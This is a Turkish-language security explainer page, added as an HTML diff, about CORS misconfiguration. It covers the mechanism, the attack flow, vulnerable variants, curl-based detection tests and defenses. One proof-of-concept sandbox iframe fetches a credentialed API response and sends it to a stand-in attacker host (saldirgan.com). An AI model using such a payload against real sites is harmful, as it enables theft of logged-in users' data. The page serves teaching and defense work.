@@ -1,0 +1,475 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>CORS Yanlış Yapılandırması</title>
+<style>
+/* Layout: single-column technical dossier — terminal-style header band,
+   numbered findings as the spine, code blocks treated as evidence panels */
+:root{
+  --bg:#f5f3ee;
+  --surface:#ffffff;
+  --ink:#1c1b19;
+  --muted:#6b6457;
+  --line:#e2ddd1;
+  --accent:#b5472f;
+  --accent-ink:#ffffff;
+  --code-bg:#1c1b19;
+  --code-fg:#e7e3d8;
+  --code-dim:#8f8a7c;
+  --ok:#3f6b4a;
+  --bad:#b5472f;
+  color-scheme:light;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#161513;
+    --surface:#1e1c19;
+    --ink:#ece7da;
+    --muted:#9b9486;
+    --line:#332f29;
+    --accent:#e07a5f;
+    --accent-ink:#161513;
+    --code-bg:#0f0e0c;
+    --code-fg:#e7e3d8;
+    --code-dim:#776f62;
+    --ok:#6fae7e;
+    --bad:#e07a5f;
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#161513;
+  --surface:#1e1c19;
+  --ink:#ece7da;
+  --muted:#9b9486;
+  --line:#332f29;
+  --accent:#e07a5f;
+  --accent-ink:#161513;
+  --code-bg:#0f0e0c;
+  --code-fg:#e7e3d8;
+  --code-dim:#776f62;
+  --ok:#6fae7e;
+  --bad:#e07a5f;
+  color-scheme:dark;
+}
+
+*{box-sizing:border-box}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"IBM Plex Sans", -apple-system, "Segoe UI", sans-serif;
+  padding-left:max(16px, env(safe-area-inset-left,0px));
+  padding-right:max(16px, env(safe-area-inset-right,0px));
+}
+::selection{background:var(--accent);color:var(--accent-ink)}
+
+.wrap{
+  max-width:760px;
+  margin:0 auto;
+  padding-block:48px 80px;
+}
+
+/* header */
+.kicker{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:12px;
+  letter-spacing:.1em;
+  text-transform:uppercase;
+  color:var(--muted);
+  margin-bottom:18px;
+}
+.kicker::before{
+  content:"";
+  width:8px;height:8px;border-radius:50%;
+  background:var(--accent);
+  flex:none;
+}
+h1{
+  font-family:"Fraunces", Georgia, serif;
+  font-weight:600;
+  font-size:clamp(32px,6vw,48px);
+  line-height:1.05;
+  letter-spacing:-.01em;
+  margin:0 0 14px;
+  text-wrap:balance;
+}
+.dek{
+  font-size:17px;
+  line-height:1.6;
+  color:var(--muted);
+  max-width:60ch;
+  margin:0 0 32px;
+}
+.meta-row{
+  display:flex;
+  flex-wrap:wrap;
+  gap:10px;
+  margin-bottom:40px;
+}
+.chip{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:11.5px;
+  letter-spacing:.03em;
+  padding:5px 11px;
+  border:1px solid var(--line);
+  border-radius:100px;
+  color:var(--muted);
+  background:var(--surface);
+}
+
+/* section scaffolding */
+section{margin-top:56px}
+.s-head{
+  display:flex;
+  align-items:baseline;
+  gap:14px;
+  border-bottom:1px solid var(--line);
+  padding-bottom:12px;
+  margin-bottom:22px;
+}
+.s-num{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:13px;
+  color:var(--accent);
+  flex:none;
+}
+h2{
+  font-family:"Fraunces", Georgia, serif;
+  font-weight:600;
+  font-size:22px;
+  margin:0;
+  letter-spacing:-.01em;
+}
+p{line-height:1.65;font-size:15.5px;margin:0 0 14px;max-width:68ch}
+strong{font-weight:600}
+.lede{color:var(--muted)}
+
+/* header header kv */
+.kv{
+  display:grid;
+  grid-template-columns:auto 1fr;
+  gap:6px 16px;
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:13px;
+  background:var(--surface);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:16px 18px;
+  margin:18px 0;
+}
+.kv dt{color:var(--muted)}
+.kv dd{margin:0;color:var(--ink)}
+
+/* code */
+pre{
+  background:var(--code-bg);
+  color:var(--code-fg);
+  border-radius:10px;
+  padding:18px 20px;
+  overflow-x:auto;
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:13px;
+  line-height:1.6;
+  margin:0 0 16px;
+  border:1px solid var(--line);
+}
+pre .c{color:var(--code-dim)}
+pre .hl{color:var(--accent)}
+pre .ok{color:var(--ok)}
+code.inline{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  background:var(--surface);
+  border:1px solid var(--line);
+  padding:1px 6px;
+  border-radius:5px;
+  font-size:.9em;
+}
+.code-label{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:11px;
+  letter-spacing:.08em;
+  text-transform:uppercase;
+  color:var(--muted);
+  margin:0 0 8px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.code-label .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+.code-label.bad{color:var(--bad)}
+.code-label.ok{color:var(--ok)}
+
+/* findings cards */
+.finding{
+  border:1px solid var(--line);
+  border-radius:12px;
+  background:var(--surface);
+  padding:20px 22px;
+  margin-bottom:16px;
+}
+.finding h3{
+  font-family:"Fraunces", Georgia, serif;
+  font-size:17px;
+  margin:0 0 8px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.finding h3 .idx{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:12px;
+  color:var(--accent-ink);
+  background:var(--accent);
+  border-radius:5px;
+  padding:2px 7px;
+  flex:none;
+}
+.finding p{margin-bottom:0;font-size:14.5px}
+.finding p + p{margin-top:8px}
+
+/* checklist */
+.checklist{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:10px}
+.checklist li{
+  display:flex;
+  gap:12px;
+  align-items:flex-start;
+  font-size:14.5px;
+  line-height:1.55;
+  padding:12px 14px;
+  background:var(--surface);
+  border:1px solid var(--line);
+  border-radius:10px;
+}
+.checklist .mark{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:12px;
+  color:var(--accent);
+  flex:none;
+  margin-top:2px;
+}
+
+/* flow */
+.flow{
+  display:flex;
+  flex-direction:column;
+  gap:0;
+  margin:20px 0;
+}
+.flow-step{
+  display:grid;
+  grid-template-columns:28px 1fr;
+  gap:14px;
+  padding:14px 0;
+  border-bottom:1px dashed var(--line);
+  min-width:0;
+}
+.flow-step:last-child{border-bottom:none}
+.flow-dot{
+  width:28px;height:28px;border-radius:50%;
+  background:var(--surface);
+  border:1.5px solid var(--accent);
+  color:var(--accent);
+  display:flex;align-items:center;justify-content:center;
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:12px;
+  flex:none;
+}
+.flow-body{min-width:0}
+.flow-who{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:11px;
+  letter-spacing:.06em;
+  text-transform:uppercase;
+  color:var(--muted);
+  margin-bottom:3px;
+}
+.flow-text{font-size:14.5px;line-height:1.55}
+
+/* defense table */
+.defense{
+  display:grid;
+  gap:10px;
+}
+.defense-row{
+  display:grid;
+  grid-template-columns:1fr;
+  gap:4px;
+  padding:14px 16px;
+  border-left:3px solid var(--ok);
+  background:var(--surface);
+  border-radius:0 10px 10px 0;
+}
+.defense-row b{font-size:14.5px}
+.defense-row span{font-size:13.5px;color:var(--muted);line-height:1.5}
+
+/* footer note */
+.note{
+  margin-top:56px;
+  padding:18px 20px;
+  border:1px dashed var(--line);
+  border-radius:10px;
+  font-size:14px;
+  color:var(--muted);
+  line-height:1.6;
+}
+.note b{color:var(--ink)}
+
+@media (max-width:520px){
+  .kv{grid-template-columns:1fr;font-size:12.5px}
+  h1{font-size:30px}
+}
+</style>
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces:wght@500;600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap">
+
+<div class="wrap">
+
+  <div class="kicker">Web Güvenliği · Zafiyet Notu</div>
+  <h1>CORS Yanlış Yapılandırması: Tespit ve Sömürü</h1>
+  <p class="dek">Access-Control-Allow-Origin ve Allow-Credentials header'larının gevşek yapılandırılması, oturum açmış bir kullanıcının verisinin başka bir origin'den okunmasına nasıl izin veriyor — mekanizmadan test metodolojisine.</p>
+
+  <div class="meta-row">
+    <span class="chip">Same-Origin Policy</span>
+    <span class="chip">HTTP Response Headers</span>
+    <span class="chip">Credentialed Request</span>
+    <span class="chip">OWASP A05</span>
+  </div>
+
+  <section>
+    <div class="s-head"><span class="s-num">01</span><h2>Mekanizma</h2></div>
+    <p>Tarayıcı, varsayılan olarak <strong>same-origin policy</strong> uygular: <code class="inline">a.com</code> üzerindeki JavaScript, <code class="inline">b.com</code>'a istek atabilir ama cevabı <em>okuyamaz</em> — istek gider, response tarayıcı tarafında bloklanır. CORS, sunucunun belirli origin'lere bu okumayı açmasını sağlayan bir izin mekanizmasıdır.</p>
+    <p class="lede">Zafiyet, sunucunun izni gelen <code class="inline">Origin</code> header'ını doğrulamadan geri yansıtmasından doğar. Bu durumda saldırgan kendi sitesinden istek atar, kurbanın tarayıcısı kurbanın çerezini otomatik ekler, ve sunucu cevabı saldırgana okutmasına izin verir.</p>
+    <div class="kv">
+      <dt>Access-Control-Allow-Origin</dt><dd>cevabı hangi origin'in okuyabileceği</dd>
+      <dt>Access-Control-Allow-Credentials</dt><dd>cookie/auth taşıyan isteklere izin var mı</dd>
+      <dt>Kritik kombinasyon</dt><dd>ikisi birlikte + Origin kontrolsüz yansıtılıyor</dd>
+    </div>
+  </section>
+
+  <section>
+    <div class="s-head"><span class="s-num">02</span><h2>Saldırı Akışı</h2></div>
+    <div class="flow">
+      <div class="flow-step">
+        <div class="flow-dot">1</div>
+        <div class="flow-body">
+          <div class="flow-who">Kurban</div>
+          <div class="flow-text">hedef.com'da oturum açar, çerez tarayıcıda saklanır.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-dot">2</div>
+        <div class="flow-body">
+          <div class="flow-who">Kurban</div>
+          <div class="flow-text">saldırganın hazırladığı sayfayı ziyaret eder (link, reklam, iframe).</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-dot">3</div>
+        <div class="flow-body">
+          <div class="flow-who">Saldırgan sayfası</div>
+          <div class="flow-text"><code class="inline">credentials: 'include'</code> ile hedef.com API'sine fetch atar; kurbanın çerezi otomatik gider.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-dot">4</div>
+        <div class="flow-body">
+          <div class="flow-who">hedef.com</div>
+          <div class="flow-text">gelen Origin'i doğrulamadan <code class="inline">ACAO</code> olarak geri yansıtır, <code class="inline">Allow-Credentials: true</code> ekler.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-dot">5</div>
+        <div class="flow-body">
+          <div class="flow-who">Tarayıcı</div>
+          <div class="flow-text">bu izni görünce cevabı saldırganın JS koduna okutur.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-dot">6</div>
+        <div class="flow-body">
+          <div class="flow-who">Saldırgan</div>
+          <div class="flow-text">çalınan veriyi kendi sunucusuna sızdırır; hesap bilgisi, API key, CSRF token olabilir.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="s-head"><span class="s-num">03</span><h2>Zafiyetli Varyantlar</h2></div>
+
+    <div class="finding">
+      <h3><span class="idx">A</span>Origin yansıtma (reflection)</h3>
+      <p>Sunucu gelen <code class="inline">Origin</code> header'ını kontrolsüz aynen geri basar. En yaygın ve en tehlikeli hata — her origin kabul edilmiş olur.</p>
+      <div class="code-label bad"><span class="dot"></span>İstek → Cevap</div>
+      <pre>Origin: https://evil.com
+<span class="c">↓ sunucu kontrol etmeden yansıtıyor</span>
+Access-Control-Allow-Origin: <span class="hl">https://evil.com</span>
+Access-Control-Allow-Credentials: <span class="hl">true</span></pre>
+    </div>
+
+    <div class="finding">
+      <h3><span class="idx">B</span>null origin'e güven</h3>
+      <p>Sandbox'lı iframe, <code class="inline">file://</code> protokolü veya redirect zincirlerinde tarayıcı <code class="inline">Origin: null</code> gönderir. Sunucu bunu beyaz listeye almışsa, sandbox iframe ile tetiklenebilir.</p>
+      <div class="code-label bad"><span class="dot"></span>PoC — sandbox iframe</div>
+      <pre>&lt;iframe sandbox="allow-scripts allow-top-navigation"
+  src="data:text/html,&lt;script&gt;
+    fetch('https://hedef.com/api/gizli',{credentials:'include'})
+      .then(r=&gt;r.text())
+      .then(d=&gt;fetch('https://saldirgan.com/log?d='+encodeURIComponent(d)))
+  &lt;/script&gt;"&gt;&lt;/iframe&gt;</pre>
+    </div>
+
+    <div class="finding">
+      <h3><span class="idx">C</span>Zayıf whitelist mantığı</h3>
+      <p>Regex veya <code class="inline">includes()</code> ile yapılan gevşek eşleştirme, beklenmeyen origin'leri de kabul ettirebilir. Subdomain whitelisting'de bir alt alan adının ele geçirilmesi (subdomain takeover) tüm beyaz listeyi tehlikeye atar.</p>
+      <div class="code-label bad"><span class="dot"></span>Sunucu mantığı</div>
+      <pre><span class="c"># Yanlış: substring kontrolü</span>
+if origin.includes("hedefsite.com"): allow
+
+<span class="c"># Bu origin'ler de geçer:</span>
+hedefsite.com.evil.com
+evilhedefsite.com</pre>
+    </div>
+  </section>
+
+  <section>
+    <div class="s-head"><span class="s-num">04</span><h2>Tespit Metodolojisi</h2></div>
+    <p class="lede">Hedef endpoint'e farklı <code class="inline">Origin</code> değerleriyle istek atıp sunucunun davranışı gözlemlenir.</p>
+    <div class="code-label"><span class="dot"></span>curl ile manuel test</div>
+    <pre>curl -i -H "Origin: https://evil.com" \
+  https://hedef.com/api/user/profile
+
+curl -i -H "Origin: https://hedefsite.com.evil.com" \
+  https://hedef.com/api/user/profile
+
+curl -i -H "Origin: null" \
+  https://hedef.com/api/user/profile</pre>
+
+    <ul class="checklist">
+      <li><span class="mark">01</span><span><strong>ACAO yansıması:</strong> cevaptaki <code class="inline">Access-Control-Allow-Origin</code>, gönderilen Origin'i aynen mi içeriyor?</span></li>
+      <li><span class="mark">02</span><span><strong>Credentials kombinasyonu:</strong> <code class="inline">Allow-Credentials: true</code> ile birlikte mi geliyor? İkisi bir aradaysa ve origin kontrolsüzse kritik zafiyettir.</span></li>
+      <li><span class="mark">03</span><span><strong>Hassas veri:</strong> profil bilgisi, API anahtarı, CSRF token veya admin paneli verisi döndüren endpoint'ler öncelikli test hedefidir.</span></li>
+      <li><span class="mark">04</span><span><strong>Preflight davranışı:</strong> <code class="inline">OPTIONS</code> isteğiyle hangi metod ve header'lara izin verildiği kontrol edilir.</span></li>
+    </ul>
+
+    <div class="note"><b>Not:</b> <code class="inline">Access-Control-Allow-Origin: *</code> ile <code class="inline">Access-Control-Allow-Credentials: true</code> aynı anda geçerli bir kombinasyon değildir — tarayıcı bunu reddeder. Asıl tehlike <code class="inline">*</code> değil, origin'in dinamik olarak <strong>yansıtılmasıdır</strong>.</div>
+  </section>
+
+  <section>
+    <div class="s-head"><span class="s-num">05</span><h2>Savunma</h2></div>
+    <div class="defense">
+      <div class="defense-row"><b>Sabit whitelist</b><span>Tam string karşılaştırma kullanın — regex veya <code class="inline">includes()</code> ile gevşek eşleştirme değil.</span></div>
+      <div class="defense-row"><b>null origin'i reddet</b><span>Hiçbir koşulda <code class="inline">Origin: null</code>'a ACAO izni vermeyin.</span></div>
+      <div class="defense-row"><b>Credentials'ı kısıtlayın</b><span>Çerez gerektirmeyen endpoint'lerde <code class="inline">Allow-Credentials</code> header'ını hiç göndermeyin.</span></div>
+      <div class="defense-row"><b>İzolasyon</b><span>Hassas işlemler için ayrı subdomain veya sunucu taraflı proxy kullanmayı değerlendirin.</span></div>
+      <div class="defense-row"><b>Ek katman</b><span>CSRF token'lar yanlış yapılandırmanın etkisini azaltır ama tek başına çözüm değildir.</span></div>
+    </div>
+  </section>
+
+  <div class="note">Bu içerik yalnızca eğitim amaçlıdır. Yalnızca sahibi olduğunuz veya yazılı izniniz olan sistemler üzerinde test yapın — yetkisiz test birçok yargı alanında suç teşkil eder. Uygulamalı pratik için <strong>PortSwigger Web Security Academy</strong>'nin CORS laboratuvarları ücretsiz ve izole bir ortam sunar.</div>
+
+</div>
+
+</body></html>
